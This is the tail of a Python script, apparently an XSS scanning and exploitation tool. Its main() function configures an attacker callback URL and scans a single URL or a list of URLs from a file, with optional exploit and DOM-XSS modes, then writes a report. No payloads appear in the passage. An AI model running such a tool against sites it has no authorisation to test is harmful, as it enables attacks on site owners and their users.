    framework = AdvancedXSSFramework(attacker_url=args.attacker)
    
    try:
        if args.url:
            framework.scan_url(args.url, args.scan_type, args.exploit)
            if args.dom_xss:
                framework.scan_for_dom_xss(args.url)
        
        if args.file:
            with open(args.file, 'r') as f:
                urls = [line.strip() for line in f if line.strip() and not line.startswith('#')]
            
            print(f"{Colors.CYAN}[*] Loaded {len(urls)} URLs from file{Colors.RESET}")
            for url in urls:
                if not url.startswith(('http://', 'https://')):
                    url = 'http://' + url
                framework.scan_url(url, args.scan_type, args.exploit)
                if args.dom_xss:
                    framework.scan_for_dom_xss(url)
                time.sleep(1)
        
        framework.generate_report()
        
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[-] Scan interrupted by user{Colors.RESET}")
        framework.generate_report()
        sys.exit(0)

if __name__ == '__main__':
    main()
